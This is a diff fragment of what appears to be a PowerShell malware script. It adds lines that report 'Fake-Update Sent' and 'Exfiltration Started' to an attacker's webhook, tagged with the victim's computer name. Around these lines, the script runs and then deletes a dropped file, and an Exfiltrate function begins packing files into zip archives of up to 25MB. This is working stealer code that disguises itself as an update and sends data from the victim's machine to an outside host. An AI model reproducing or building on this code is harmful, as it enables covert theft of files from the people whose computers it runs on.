@@ -102,9 +102,13 @@ sleep 1
 Start-Process -FilePath $pth
 sleep 3
 Remove-Item -Path $pth -Force
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 }
 
 Function Exfiltrate {
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":file_folder: ``Exfiltration Started..`` :file_folder:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 $maxZipFileSize = 25MB
 $currentZipSize = 0
 $index = 1
